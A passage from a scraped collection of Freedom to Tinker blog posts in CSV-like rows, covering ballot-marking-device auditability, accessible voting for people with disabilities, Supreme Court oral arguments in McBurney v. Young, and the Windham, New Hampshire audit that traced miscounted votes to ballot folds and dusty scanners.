BMD is not supposed to behave this way? I pose this just as an example of how to think about the “threat model” of voting machines. Those voters who noticed the machine cheating but didn’t speak up in the study, then claimed that if it were a real polling place they would speak up– really? In real life, there are many occurrences of voters seeing something they feel is wrong at the polling place, but waiting until they get home before calling someone to talk about it. Many people feel a bit intimidated in situations like this. So it’s difficult to translate what people say they will do, into what really they will do. Professor Gilbert suggests (in his talk) that he’ll change the prompt from “Please review your selection below. Touch your selection to continue.” to something like “Please review your selection below. If it is correct, touch it. If it is wrong, please notify a pollworker.” This does seem like it would improve the rate at which voters would report errors. It will be interesting to see."
"108","2019-04-22","2023-03-24","https://freedom-to-tinker.com/2019/04/22/bmds-are-not-meaningfully-auditable/","The 2019 article described here was later revised and published in a peer-reviewed journal as, Ballot-Marking Devices Cannot Assure the Will of the Voters, by Andrew W. Appel, Richard A. DeMillo, and Philip B. Stark. Election Law Journal, vol. 19 no. 3, pp. 432-450, September 2020. (Non-paywall version, differs in formatting and pagination). This paper has just been released on SSRN. In this paper we analyze, if a BMD were hacked to cheat, to print rigged votes onto the paper ballot; and even suppose voters carefully inspected their ballots (which most voters don’t do), and even supposing a voter noticed that the wrong vote was printed, what then? To assess this question, we characterize under what circumstances a voting system is “contestable” or “defensible.” Voting systems must be contestable and defensible in order to be meaningfully audited, and unfortunately BMDs are neither contestable nor defensible. Hand-marked paper ballots, counted by an optical-scan voting machine, are both contestable and defensible. Ballot-Marking devices (BMDs) cannot assure the will of the voters by Andrew W. Appel, Richard A. DeMillo, and Philip B. Stark Abstract: Computers, including all modern voting systems, can be hacked and misprogrammed. The scale and complexity of U.S. elections may require the use of computers to count ballots, but election integrity requires a paper-ballot voting system in which, regardless of how they are initially counted, ballots can be recounted by hand to check whether election outcomes have been altered by buggy or hacked software. Furthermore, secure voting systems must be able to recover from any errors that might have occurred. However, paper ballots provide no assurance unless they accurately record the vote as the voter expresses it. Voters can express their intent by hand-marking a ballot with a pen, or using a computer called a ballot-marking device (BMD), which generally has a touchscreen and assistive interfaces. Voters can make mistakes in expressing their intent in either technology, but only the BMD is also subject to systematic error from computer hacking or bugs in the process of recording the vote on paper, after the voter has expressed it. A hacked BMD can print a vote on the paper ballot that differs from what the voter expressed, or can omit a vote that the voter expressed. It is not easy to check whether BMD output accurately reflects how one voted in every contest. Research shows that most voters do not review paper ballots printed by BMDs, even when clearly instructed to check for errors. Furthermore, most voters who do review their ballots do not check carefully enough to notice errors that would change how their votes were counted. Finally, voters who detect BMD errors before casting their ballots, can correct only their own ballots, not systematic errors, bugs, or hacking. There is no action that a voter can take to demonstrate to election officials that a BMD altered their expressed votes, and thus no way voters can help deter, detect, contain, and correct computer hacking in elections. That is, not only is it inappropriate to rely on voters to check whether BMDs alter expressed votes, it doesn’t work. Risk-limiting audits of a trustworthy paper trail can check whether errors in tabulating the votes as recorded altered election outcomes, but there is no way to check whether errors in how BMDs record expressed votes altered election out- comes. The outcomes of elections conducted on current BMDs therefore cannot be confirmed by audits. This paper identifies two properties of voting systems, contestability and defensibility, that are necessary conditions for any audit to confirm election outcomes. No commercially available EAC-certified BMD is contestable or defensible. To reduce the risk that computers undetectably alter election results by printing erroneous votes on the official paper audit trail, the use of BMDs should be limited to voters who require assistive technology to vote independently."
"109","2021-05-27","2023-03-24","https://freedom-to-tinker.com/2021/05/27/accommodating-voters-with-disabilities/","Citizens with disabilities have as much right to vote as anyone else, and our election systems should fully accommodate them. In recent years some advocates have claimed that electronic ballot return, in other words internet voting, is needed to accommodate voters with disabilities. But internet voting is dangerously insecure–in the context of U.S. public elections there is no known technology that can secure vote-by-internet against hacking by insiders or outsiders. So it is worth asking the voters themselves, how they vote and how they want to vote. And it turns out, most voters with disabilities voted by mail-in paper ballot in 2020, and want to continue voting that way. Currently in the United States, out of 245 million adults, approximately: 3.6 million are in wheelchairs, 6.7 million have difficulty grasping objects, 20 million are visually impaired, 1.8 million are legally blind; and in all about 35 million report having some kind of disability. A recent report by Professors Lisa Schur and Douglas Kruse of Rutgers University, “Disability and Voting Accessibility in the 2020 Elections,” provides very useful information. Voting difficulties for people with disabilities declined markedly from 2012 to 2020, mostly because of the large pandemic-related shift to mail-in ballots. 83% of voters with disabilities voted independently without any difficulty in 2020; and 89% were able to vote (independently or with assistance) without difficulty; this compares to 94% of voters without disabilities who were able to vote without difficulty. The percentage of voters who said that voting at a polling place was “very easy” was almost identical in 2020 between voters with and without disabilities (82% versus 83%). The percentage who said voting on mail-in ballots was “very easy” was also almost identical (79% versus 81%). However, only 64% of those with vision impairments said it was “very easy” to vote by mail. Regarding the ability to vote independently, only 6% of voters with disabilities needed assistance at a polling place, and 5% needed assistance completing their mail-in ballot; but 11% needed assistance in returning the ballot. 16% of voters with vision impairment needed assistance in the polling place. Of all voters with disabilities who needed assistance in the polling place, only 83% actually received assistance. The turnout gap Almost all of these numbers were significantly better in 2020 than in 2012. Either the U.S. has made progress in accommodating voters with disabilities, or the general shift to mail-in ballots accommodates the needs of those voters, or both. In 2020, people with disabilities voted at a 7% lower rate than people of the same age without disabilities. Voting by smartphone or computer About 8% of voters with disabilities want to vote fully online by smartphone or computer, compared to 12% of voters without disabilities. Among voters with vision impairment, only 2% wanted to vote this way. Among nonvoters, 27% of those with disabilities (9% of those with vision impairment) and 20% of those without disabilities want to vote online. Some states offered the option in 2020 of receiving a ballot online, filling it out on the computer, printing it, and mailing the paper ballot. (Or, receiving the ballot online, printing it, marking it with a pen, and mailing it.) This form of remote accessible voting (RAV) is regarded by experts as securable enough in principle* to be used in public elections (see the NASEM report or the CISA report). About 4% of voters with disabilities and 10% of nonvoters (with or without disabilities) would like to vote this way. Professors Schur and Kruse speculate that these small percentages may be because of “lack of familiarity” with this method that “has promise for enabling people with vision impairments to vote confidentially at home.” Analysis Electronic ballot return (EBR)–casting ballots over the internet–is known to be insecure, and not securable by any known technology. Many people would like to vote, paperless, on their computers or smartphones–and if were possible to do so securely and fairly and with equal access, I might want to as well. Even though it’s impossible to make secure, the argument is sometimes advanced that we need EBR to accommodate voters with disabilities. But the Rutgers opinion surveys (quoted above) show that voters with disabilities are less likely than other voters to want this. You might argue, nonvoters with disabilities need this in order to become voters. But the Rutgers opinion surveys show that nonvoters with vision impairment are less likely to want EBR than other nonvoters. And nonvoters with other disabilities are about as likely to want EBR as nonvoters without disabilities. So I think these arguments–that voters with disabilities want and need EBR—are unsupported by evidence. Conclusions This survey data about the actual experiences and preferences of voters with and without disabilities shows that improvements in U.S. election procedures and systems, and the motivation of people with disabilities to vote, have made significant improvements: both in the rate of voting (by people with disabilities) and the ease of voting (in person and by mail). While we all would appreciate the convenience of internet voting if only it were possible to do that reliably and securely, the proportion of people with disabilities who wish to vote by internet is not appreciably different than the proportion of those without disabilities; and a significantly smaller proportion of voters with visual impairments want to vote that way. So it seems that those voters are not correctly portrayed by the National Federation for the Blind, which has been lobbying hard for electronic ballot return. But recently the NFB has agreed** that EBR is not necessary for a “fair, reasonable, and adequate” system of remote accessible voting, so that’s progress. What next? Noel Runyan, a California computer scientist and voting expert who is legally blind, writes [with my explanations in brackets], Instead of resorting to more uncontrolled use of electronic ballot return (EBR), election reform bills such as S.1. should focus on encouraging and providing funding for effective ways to address the needs of voters with disabilities. For example, several concrete activities for which S.1. could provide grants are: 1. Independent testing and reporting about the security and usability of remote accessible voting systems. [That is, systems that allow the voter to download a ballot, mark it using an accessible interface, print it, and mail it; these are securable in principle but some vendors’ products are insecure or really difficult to use.] 2. Development of scanning apps for accessible verification of paper ballots with ballot mark-sensing optical character recognition (OCR). [That is, suppose a blind voter uses a ballot-marking device or computer to mark a ballot, which then gets printed out for ballot-return, to avoid the severe insecurities with electronic ballot return. The voter would like to be able to use a smartphone app to see what’s printed on the ballot. Such apps already exist for many kinds of documents, but what’s needed is an app that can understand the concept of “filled in ovals” that indicate votes, and correlate them to the candidate names.] 3. Support and guidelines for different types of mobile voting, including: bringing ballots and portable voting equipment to senior centers and retirement facilities, and “Go-to-Voter” services where election officials bring portable accessible voting directly to individual voters (most Oregon counties provide such service). 4. Improving accessibility of pre- and post-election related information, more accessible county election websites and Personalized Election Results (PER) summarizing election results based on the voter’s own precinct. [That is, some text-based web site designs are readily accessible to blind voters through the use of screen-reader browser plug-ins, but other web sites that rely heavily on graphics and images without alternate text can be difficult or impossible to interpret with screen-reader plugins. This problem plagues both commercial websites (online shopping) and noncommercial web sites (county election web sites), and there are many things that election administrators could do to improve the accessibility of their web sites.] [Noel Runyan continues,] I’d like to see improvements to voting accessibility for all voters, and especially for those with disabilities. But we can do that without having to trade away privacy and security for the assumed benefits of EBR for a few. Footnotes. *In principle it can be adequately secure to deliver unvoted ballots to voters by electronic means, for the voter to print and mark at home and mail back on paper, or mark on a home computer and then print and mail. The reason it’s securable is that the voter can verify what’s printed on the paper, and it’s the same piece of paper that will be counted by the voting machine or in a recount or audit. But actual implementations of this voting mode–actual “remote accessible voting” products offered by certain vendors to states and counties–are not necessarily secure. See this article. ** The NFB has lobbied in many states and in the U.S. Congress for electronic ballot return (that is, internet voting), and has sued many states. However, in 2020 the NFB of Virginia’s lawsuit against the State of Virginia led to a consent decree in which the NFB and State agreed on a system of remote accessible voting (RAV) that includes, among other things: “[Virginia] will make available to all localities a tool that will allow print disabled voters to electronically and accessibly receive and mark absentee ballots using screen reader assistive technology (the Ballot Marking Tool). … Any voter who utilizes the Ballot Marking Tool shall still be required to mail or physically return their absentee ballot to the relevant general registrar. … The agreement represents a fair, reasonable, and adequate resolution of this dispute and is squarely in the public interest.”"
"110","2013-02-21","2023-03-24","https://freedom-to-tinker.com/2013/02/21/a-reivew-of-oral-arguments-in-mcburney-v-young-state-foia-and-state-rights/","Yesterday, I attended oral arguments in the Supreme Court case of McBurney v. Young, which I have previously written about. The case involves two different petitioners who were denied access to state records under a Virginia “freedom of information” law that limits such access to Virginia residents only. McBurney is a former Virginia resident who wanted some records related to an ongoing child support dispute. Hurlbert is a government information aggregator and reseller. At issue is whether this preferential treatment is constitutional under the Constitution’s “Privileges and Immunities” clause, as well as the “Dormant Commerce Clause.” In my previous post, I discussed these doctrines in more detail, but I devoted most of my time to describing the privileges and immunities argument — essentially that citizens must receive equal treatment across all states when it comes to “fundamental rights.” While waiting for arguments to begin, I was chatting with another person in the audience. I asked him whether he thought that the argument was going to focus significantly on states’ rights, and he said he expected more time to be devoted to the question of whether or not the rights in question were “fundamental.” It turned out that, with the boisterous support of Justice Scalia, states’ rights were the order of the day. [Update: Transcript of the arguments is available here] Arguments began with Deepak Gupta arguing for the petitioners. He noted that Virginia is one of only two or three states with such an exception. Justice Scalia jumped in, noting that he remembered when these laws were passed. He asked how a law passed in the 1960’s or 1970’s could possibly constitute a “fundamental right” that would meet the standard of the privileges and immunities clause. Of course, as a general matter, Scalia thinks that “The Freedom of Information Act Has No Clothes”. Chief Justice Roberts pointed out that Hurlbert could just ask someone in Virginia to get the records for him, and Justice Ginsberg asked Gupta to describe Hurlbert’s business. Gupta explained that the business of collating and reselling government documents has been a “common calling” for a very long time. Thus, he explained, it is both a “fundamental right” as envisioned by the privileges and immunities clause, and something protected from state interference under the dormant commerce clause. Although this common calling–and common-law right of access to records–predates the Virginia FOIA, he argued that the Virginia law (perhaps paradoxically) removes this right for non-residents. Scalia again pointed out that the intent of these statutes was to foster visibility into government by the people that those laws governed–in this case, state residents. He asked why Virginia doesn’t have a right to prevent “outlanders” from “mucking around” in their business. The other justices grilled Gupta on the statute’s intent, the state’s interest in controlling its records, and what precedent would lead them to believe that the law is a restriction on interstate commerce or is discriminatory of some fundamental right. Gupta finished his argument without mentioning McBurney at all. This was surprising to me, because I had assumed that the most compelling case would be the plight of this (former) resident who sought to obtain a fair outcome in a state-mediated dispute. These points are made in the petitioners’ briefs, and I focused almost entirely on them in my summary (Hurlbert and the dormant commerce clause argument was a parenthetical at the end). However, counsel evidently decided that this court was more interested in hearing about Hurlbert and issues of commerce (whether they related to the commerce clause or the privileges and immunities clause). I have a lot to learn. Next up was the Solicitor General for Virginia, Earle Duncan Getchell, Jr. Before he could even get started, Justice Sotomayor jumped in to ask him about the intent of the statute, and whether it had any commercial effect. The Solicitor General answered that the statute was not commercial in nature, and that it was motivated by an internal policy interest of Virginians (an interest which was not entirely clear to me or to several of the Justices). The Chief Justice asked him why they don’t just make the records available anyway. He asked why they bother to keep others out. He observed that the cost of maintaining them is already incurred. Justice Scalia jumped in to ask, rhetorically, whether it is the law that the State of Virginia may not do things that are pointless, that only the Federal Government may do things that are pointless (reminding the room that this was, as far as he was concerned, a matter of state rights). There nevertheless ensued a great deal of questioning about why the law would exist in the first place, and the Solicitor General said that Virginia did not need to justify itself to out-of-staters. Justice Breyer noted that if there is a legitimate constitutional claim, then a justification of “meh” is not sufficient (I believe that this is close to a direct quote, but it is hard to transcribe the noise that the Justice made). Justice Kagan admitted that she was not present at the formation of state FOIA laws (ha ha), but suggested that they had in any case come to stand for not only sunshine but also the free flow of information. Several justices asked the Solicitor General about the commercial value or effect of the records, and he claimed ignorance (something that SCOTUS Blog discussed in their coverage). Near the end, Justice Scalia reminded the audience that the documents at issue were “owned” by the State of Virginia. In his short reply, Gupta suggested that especially in a situation in which a state has monopoly control over a good that is essential to commerce and/or a common calling, it is unconstitutional for it to discriminate in granting access to it. McBurney was finally mentioned in the last two minutes of oral arguments. In between comments from Justice Scalia about how non-residents were taking advantage of records maintained using Virginians’ resources, Gupta made a very brief case for McBurney’s fundamental right of equal access to government records under the privileges and immunities clause. Also, by my count, if you were taking a drink every time elk hunting was mentioned, you would have had to drink three times. Of course, you’re not allowed to bring beverages into the Supreme Court, and we’re not allowed to watch at home because Justice Sotomayor doesn’t think that we would understand what’s going on."
"111","2021-06-07","2023-03-24","https://freedom-to-tinker.com/2021/06/07/new-hampshire-election-audit-part-2/","In my previous post I explained the preliminary conclusions from the three experts engaged by New Hampshire to examine an election anomaly in the town of Windham, November 2020. Improperly folded ballots (which shouldn’t have happened) had folds that were interpreted as votes (which also shouldn’t have happened) and this wasn’t noticed by any routine procedures (where either overvote rejection or RLAs would have caught and corrected the problem)–except that one candidate happened to ask for a recount. At least in New Hampshire it’s easy to ask for a recount and the Secretary of State’s office has lots of experience doing recounts. Let’s consider these issues one at a time. Ballot folds interpreted as marks National standards for voting machines say that creases should not be interpreted as votes. The “Voluntary Voting System Standards”, version 1.0 from 2005 and version 2.0 from 2021, say this: 1.1.6-I – Ignore extraneous marks inside voting targets. The voting system must include a capability to recognize any imperfections in the ballot stock, folds, and similar insignificant marks appearing inside the voting targets and not record them as votes. But Windham, New Hampshire bought its AccuVote OS machines in 1998, so let’s look at the 1990 Federal Election Commission standards: Reading Accuracy: This … Subsystem attribute refers to the inherent capability of the read heads to … discriminate between valid … marks and extraneous perforations, smudges, and folds. Although New Hampshire does not consider itself bound by these “voluntary” standards, certainly the AccuVote OS was sold in states that asked for test reports against those 1990 standards. So presumably the AccuVote OS, when new and when properly calibrated, was supposed to ignore fold lines. However, it appears testing agencies don’t actually test for this, even if the standards call for it. It is not clear whether these machines have been recalibrated to different settings than the manufacturer preset–sometimes there are reasons for doing that. And the careful testing by the New Hampshire audit team makes it clear that the AccuVote OS does not always ignore fold lines. Fold lines through vote targets Even though voting machines are not supposed to interpret creases as votes, experienced election administrators know that they should keep the fold lines away from the vote targets (ovals that the voter fills in). Most ballots are printed by private companies that contract with local election officials. In western states, where many millions of voters routinely vote by mail, election administrators contract with their printers not only to print the ballots, but to fold them and insert them in envelopes as well, and often also to bulk-mail them directly to the voters. Those printing companies get trained (either by the election officials, or by the major voting machine companies) about how to set up their high-speed automatic equipment to fold the ballots, avoiding vote targets. But in some eastern states where there have been relatively few absentee ballots, local election officials often mail out the ballots themselves. In 2020, as in previous years, the State of New Hampshire contracted with a printing company to print their ballots. The printer printed the absentee ballots with score lines, that is, indentations in the paper that show where it should be folded–so when you fold by hand, it ought to fold at the scores. And indeed, these score lines were indented in the right place, avoiding the vote targets. If only the ballots had been folded at the score lines, there would have been no problem. Jennifer Morrell, who was a local election official in Utah and Colorado, writes, We always worked with our mail ballot printing vendor to ensure the pre-scored fold lines did not hit a target area on the ballot. It was a bit tedious because we had 600+ ballot styles but I don’t recall it ever being a problem.    My recollection is that they were always able to find a single position for each fold mark (generally just two folds so the ballot was folded in thirds) that worked with all styles. One year was challenging because our ballot was so long we had three fold marks (ballot folded in half and then in half again) which put one of them squarely in the middle of the ballot.    For flat ballots voted in-person at polling locations, we printed those “on demand” and purchased pre-scored ballot stock from the vendor (with the folds in the same position as they were on the mail ballots). This mitigated (but not alleviated completely) the risk of voters folding the ballots in a way that would create a problem. Mainly, if they folded a ballot that was not scored, there was a potential for the fold to damage the timing mark causing the ballot to be rejected by the scanning equipment as unreadable. Which then means it would need to be sent for duplication/remake. In previous years, there weren’t many absentee ballots to be mailed out, so Windham employees would fold the (prescored) ballots by hand, put them in envelopes, and mail them. Likely enough, the creases would usually be on the score lines, avoiding the vote targets. But in 2020, during the pandemic, thousands of voters requested absentee ballots. The town improvised: they used a folder/inserter machine (normally used for DMV notices) to fold the ballots; then they “ironed” the folds with a coin or scissors-handle to make them fit in their envelopes. MailMax Solutions DS-35 folder/inserter This machine is probably wonderful for its intended purpose–folding business letters, electricity bills, DMV notices, etc. before mailing to customers. But it does not put creases in exactly the right places for ballots; either because it had not been adjusted for that, or because it does not put creases straight across (they’re slightly diagonal), or because even when adjusted it doesn’t always put the crease in exactly the same place. In particular, the absentee ballots folded by the DS-35 were not folded at the score lines; many of them were folded through the vote target for Democratic candidate Kristi St. Laurent. WINDHAM!🚨Got an up close look at an official Nov 3rd ballot thanks to @WAuditors. The diagonal fold line goes through Kristi St. Laurent’s bubble on the ballot. Those folds, as demonstrated by the test scans done last week, often got mistakenly counted as votes. @RealAmVoice pic.twitter.com/ItVgH2rkUT — Heather Mullins – Real America’s Voice (RAV-TV) (@TalkMullins) May 24, 2021 Dust and calibration The fold line went through a vote target–but isn’t the voting machine supposed to ignore that? In principle, yes. But these creases are substantial ridges! Windham was using four AccuVote optical scanners on November 3rd, and the auditors found that some of these machines were much more likely than others to interpret folds as votes. The auditors also found that there was a substantial build-up of dust on the read heads of the scanners; and that these read heads were enclosed in such a way that it would be difficult to get in there and clean them, or even to notice that there was a dust build-up. And they found “dust is a major contributor to reading errors of folds;” cleaning out the dust reduced the error rate. One can imagine different hypotheses for why dust could increase the sensitivity to fold marks. Perhaps dust on the read head blurs the image, making the fold appear wider. Perhaps dust reduces sensitivity overall, so that as dust built up over the years the technicians recalibrated the machine to increase its sensitivity (so that legitimate votes were not missed). Could this be happening elsewhere? Should we be worried that election results are wrong in other jurisdictions that use AccuVote optical scanners–or any kind of optical scanners? Let’s see what chain of circumstances caused this problem: Ballots were folded improperly, in part because the COVID-19 pandemic caused a last-minute surge in absentee voters and the town had an unforeseen need to fold 3000 ballots. (In other times and places, jurisdictions that mail out thousands of folded ballots usually have them folded by printing companies that are experienced in the special requirements for ballots.) The fold line, as produced by the automatic folding machine, happened to fall upon a vote target. The AccuVote scanners had not been cleaned of a (perhaps years-long) dust buildup. Do election administrators in other places clean the read heads of their optical scanners? Are other models of voting machine susceptible to this problem? Windham had disabled overvote notification on these scanners (following State policy). That is, reading the fold as a vote caused (in hundreds of cases) more votes to be cast in this contest than allowed, so the machine noticed an overvote and didn’t count any of the votes in that contest (on that ballot). If the machine were set to reject overvoted ballots on the spot, in the presence of the voter, that gives the voter a chance to get a fresh ballot and try again. You might think that doesn’t seem apply to absentee ballots; but in fact it can: there was a poll worker feeding those absentee ballots through the scanner, and overvote rejection would give the poll worker a chance to place overvoted ballots into a separate pile for hand counting. It’s a best practice, followed in many other jurisdictions, that all overvoted ballots are segregated for manual interpretation. Results-report printout from Windham, November 3 2020, showing that overvote-return feature on AccuVote OS was disabled. Windham had ignored overvote reporting. At the close of the polls, the AccuVote OS prints out a cash-register tape with results. The overvotes are reported as BLANKS (which also includes ballots in which the voter didn’t vote at all in this contest). It would have been better if the voting machine reported OVERVOTES separately from true BLANKS. But even so, the extremely high number of blanks could have been a warning sign to investigate further, by a hand recount (without waiting for a candidate to request it)–except that such a recount would not have been legal under State law. New Hampshire does not have Risk-Limiting Audits. An RLA examines a random sample of the paper ballots, sampling just enough ballots to ensure that the outcome claimed by the voting machine is the same as you’d get by recounting the paper ballots by hand. One motivation of RLAs is to catch hacking, but they work just as well to catch any kind of systematic error. If New Hampshire had RLAs, then any problem like this that could have changed the outcome of an election would probably have been detected–and corrected by a recount. Could folds have changed votes elsewhere in New Hampshire? Possibly. Did other towns use nonstandard equipment to fold their absentee ballots? The town clerks might know. And if so, which vote target (if any) would the fold line have fallen upon? Unknown. Do other towns have AccuVote OS machines that have not been cleaned for 22 years? Probably. Do other towns disable overvote rejection? Almost certainly. Do other towns ignore high numbers of BLANKS on results printouts? Probably. Do other towns do Risk-Limiting Audits that would have caught this? No, state law prohibits that. Recommendations Optical-scan voting can be extremely accurate when best practices are followed. New Hampshire should adopt these practices immediately: Enable overvote rejection on the AccuVote OS. That means, the voting machine returns the overvoted ballot to the voter or pollworker for correction. When the voter is not present (as for an absentee ballot) the overvoted ballot should be segregated for manual counting, because often a human can readily determine the voter’s intent. When the voter is present, the voter can be given the choice of either voiding their ballot and casting a new one, or having their ballot segregated for manual counting. Clean the read heads of all their optical-scan voting machines as often as necessary, which might be every year or every four years, to be determined. This will require some disassembly of the machines. Set the voting machines to report (in each contest) the number of overvotes separately from the number of blanks. In principle there should be few reported overvotes if recommendation #1 is followed. Even so: if the number of overvotes is more than half the margin of victory in any race, examine all overvoted ballots; or if overvoted ballots cannot be segregated, recount the whole contest. Have absentee ballots folded automatically by the election-services contractor, rather than folded ad-hoc in town offices. Town Clerks should inspect a sample of absentee ballots before they are mailed to make sure the folds avoid all vote targets. If absentee ballots are mailed directly to voters by the services company, then Town Clerks should inspect a sample of the returned absentee ballots to make sure the folds are in the right place. (If not, count those ballots by hand.) Determine whether the procedures and software used for the layout of optical-scan ballots properly keep all vote targets away from any portion of the paper where folds might be made. (See “lesson” below.) Adopt Risk-Limiting Audits statewide. All the recommendations 1-5 above are reactive to the specific unforeseen problem that occurred last time. But what different problem will come up next time? The purpose of mandatory, every-election RLAs is to detect any kind of problem that might cause machine-reported results to be different from what you’d get in a correct manual recount. And these mandatory RLAs should be done before results are certified, so that if the RLA does detect a problem, then it can be immediately corrected by a recount. And one thing we learned from this is that the Secretary of State’s office can do recounts accurately. Lessons for voting machine design Humans have no difficulty understanding that a fold line is not a vote; we don’t look only within the oval, but at a more holistic context. One might think that modern algorithms, running on the more powerful CPUs that voting-machine makers put in their contemporary products, might interpret marks much more accurately than the AccuVote OS from the 1990s. I haven’t seen any evidence of this, one way or the other. It might be worth subjecting newer products to independent testing; or doing research on vote-mark recognition algorithms, or both. Furthermore, there are good standards for the design of ballots so that voters are less likely to make mistakes: Effective Designs for the Administration of Federal Elections, Section 3: Optical scan ballots. But that guide says nothing about absentee ballots; the only instructions it gives are “do not fold the ballot”, which is not useful advice for mail-in ballots. Updated design guidelines would be useful, saying vote targets shoud not be placed anywhere near the point in the paper were the fold will most naturally go. Ballot-layout software should be improved to take fold-line positions into account when placing vote targets. As it is now, it seems that the targets go where they go, and then the election administrator and printing company have to scramble to find a place where the fold can go. Finally, even though the Federal standards require optical-scan voting machines to ignore fold marks, it appears that this is not tested in the “certification test plan” for a voting machine like the AccuVote OS. If the standards say that voting machine should ignore folds, then that should be tested for."
"112","2021-06-02","2023-03-24","https://freedom-to-tinker.com/2021/06/02/new-hampshire-election-audit-part-1/","Based on preliminary reports published by the team of experts that New Hampshire engaged to examine an election discrepancy, it appears that a buildup of dust in the read heads of optical-scan voting machines (possibly over several years of use) can cause paper-fold lines in absentee ballots to be interpreted as votes. In a local contest in one town, preliminary reports suggest this caused four Republican candidates for State Representative to be deprived of about 300 votes each. That didn’t change the outcome of the election–the Republicans won anyway–but it shows that New Hampshire (and other states) may need to maintain the accuracy of their optical-scan voting machines by paying attention to three issues: Routine risk-limiting audits to detect inaccuracies if/when they occur. Clean the dust out of optical-scan read heads regularly; pay attention to the calibration of the optical-scan machines. Make sure that the machines that automatically fold absentee ballots (before mailing them to voters) don’t put the fold lines over vote-target ovals. (Same for election workers who fold ballots by hand.) Everything I write in this series will be based on public information, from the State of New Hampshire, the Town of Windham, and the tweets of the WindhamNHAuditors. In the November 3, 2020 general election in Windham, New Hampshire, the race for State Representative was very close–24 votes difference–so one candidate asked for a recount. The recount showed that she lost by hundreds of votes–not just 24. The hand recount of the optical-scan paper ballots disagreed with the numbers claimed by the optical-scan voting machines to an extent that was shocking. The citizens of New Hampshire demanded to know: were the op-scan machines hacked? Were the machines misconfigured and reading marks from the wrong place in the paper? Did creases in absentee ballots cause the op-scan machines to misread votes? Was the recount itself erroneous? The Secretary of State said that there was no provision in New Hampshire law that permitted him to do a re-recount, or to examine the voting machines for hacking. So a Republican legislator introduced a bill for a forensic audit to find out what had happened. That bill passed the legislature unanimously: … [T]his act authorizes and directs an audit of the ballot counting machines and their memory cards and the hand tabulations of ballots regarding the general election on November 3, 2020 in Windham, New Hampshire of Rockingham County district 7 house of representatives for the purpose of determining the accuracy of the ballot counting devices, the process of hand tallying, and the process of vote tabulation and certification of races. A forensic election audit team shall be formed to complete the audit described in section 3 and it shall be comprised of: one person designated by town of Windham, one person designated jointly by the … secretary of state and attorney general, [and one person to be chosen by those two auditors]. … The results of the audit shall not alter the official results of the Rockingham County district 7 house of representatives race as determined by the ruling of the ballot law commission on November 25, 2020, upholding the recount of that race. Governor Sununu signed bill SB43 into law on April 12, 2021. On April 26 the town of Windham chose Mark Lindeman of the Verified Voting Foundation as its auditor, and the Attorney General (upon the advice of the Secretary of State) chose Harri Hursti, a well known expert on the cybersecurity of voting machines and bank ATM machines. Those two then selected Philip Stark, of the University of California at Berkeley, as the third auditor. This is truly a “dream team” of experts. They know what they’re doing, they’re experienced with election audits and the forensic examination of voting machines, and they know how elections work. New Hampshire could not have found anyone better prepared to get to the heart of the matter. What happened in Windham The town of Windham has a single polling place, in which 10,006 ballots were cast: 6697 in-person and 2949 absentee scanned by machine, and 80 absentee counted by hand (because overseas “UOCAVA” ballots are in a different format that the machines didn’t accept). In New Hampshire, absentee ballots are processed in the polling place, on election day. That is, there’s a preprinted voter list. When registered voter shows up to vote in person, their name is found on the list, and crossed out. An absentee ballot envelope is processed by checking the voter’s name (from the envelope) against the same preprinted voter list, and crossing it out; then the absentee ballot is removed from the envelope, and scanned into the same voting machines that are used for in-person ballots. That procedure is a way of checking that the same person doesn’t vote absentee more than once, or doesn’t vote both absentee and in person: their name appears only once on the list, and can be crossed off only once. In Windham on November 3rd, there were four optical-scan voting machines, Global Election Systems model “AccuVote OS”, purchased in 1998 and 2000. The 6697 in-person and 2949 scannable absentee ballots were fed into those four machines during the day. That’s something like one ballot every 10 or 15 seconds into each machine, all day long! At the close of the polls, each machine printed its result out onto a “results tape”–thermal cash-register paper listing how many votes each candidate got. There were four “results tapes”, one per machine; here’s a small portion of just one of them, for the State-Rep contest: In this race, there were 8 candidates running for 4 seats, and every voter got to vote for four out of 8. Election administrators aggregated the four voting-machine results tapes by hand (along with the 80 hand-counted ballots) onto a paper worksheet to produce an official “Return of Votes” form, signed by the Town Clerk. In the race for State Rep, in 5th place out of 4 seats, Kristi St. Laurent was only 24 votes behind the 4th-place candidate Julius Soti. So she asked for a recount. By state law, those are done by hand, by the office of the Secretary of State, in Concord (the state capital). The results of the recount were: Original Recount Diff Kristi St. Laurent (D) 4,456 4,357 -99 Henri Azibert (D) 2,787 2,808 +21 Valerie Roman (D) 3,415 3,443 +28 Ioana Singureanu (D) 2,764 2,782 +18 Julius Soti (R) 4,480 4,777 +297 Mary Griffin (R) 5,292 5,591 +299 Bob Lynn (R) 4,786 5,089 +303 Charles McMahon (R) 5,256 5,554 +298 TOTAL 33,236 34,401 +1,165 As you can see, something is grossly wrong–either with the machine counts, or the hand counts, or both. The people of New Hampshire, and their legislators, wanted to understand how this happened–and how to prevent it in the future. The audit team looked at, the voting machines (and their ballot programming, and their performance under the kind of heavy usage they saw last November); the paper ballots (and associated records), as preserved by the Secretary of State from the November recount and the context, learning from election administrators in Windham and other New Hampshire towns about polling-place procedures. What caused the discrepancy The audit team has not yet written their official report, so everything I’ll describe here is only their preliminary findings as described in their tweets. The auditors supervised a careful recount by teams of 5 people (caller, checker, 2 tallyers, flagger). Members of each team included Democrats, Republicans, and independents. The hand count was within 0.05% of the official state recount, for every State Rep candidate (the State did not recount the races for President, Senator, etc.). So, basically, the official state recount was right, the voting machines were wrong; why? There is zero evidence that the voting machines were hacked. Forensic exams show that the software in these machine matches the reference machine provided by the Secretary of State’s office (the audit team will continue to examine that software to make sure the SoS’s copy is right), and there was nothing unexpected in the memory cards. Folds in ballot papers. Ballot papers marked by voters in the polling place were (generally) not folded. Absentee ballots have identical printing; they were folded in thirds before they were mailed to the voters; marked by the voters at home, refolded and mailed back to the Town Clerk, and then (on election day) scanned through the same voting machines as the in-the-polling-place ballots. What happens if a fold goes through one of the “vote targets” (the ovals that voters are supposed to fill in with a pen to indicate their choice)? The voting machine is not supposed to interpret a fold as a mark. But the audit team found that in many cases, a fold would be read as a mark: Microscopic photo of fold through a vote target. From @WindhamNHAuditors The fold lines in absentee ballots weren’t always in exactly the same place, but in hundreds of ballots they crossed through the target for Democratic candidate Kristi St. Laurent. Now, consider what happens if an voter marks all 4 Republican candidates (and none of the 4 Democratic candidates), by blackening their ovals with a pen. If the optical-scanner also interprets the fold line through one Democratic candidate as a mark, then the machine “thinks” there are 5 votes in a vote-for-4 contest; and that’s an overvote, so all of those votes won’t be counted. Many voters voted straight-party: all R, or all D. The effect of this was that hundreds of votes for the Republican candidates were not counted. An all-Democratic vote, with a fold line through a blackened 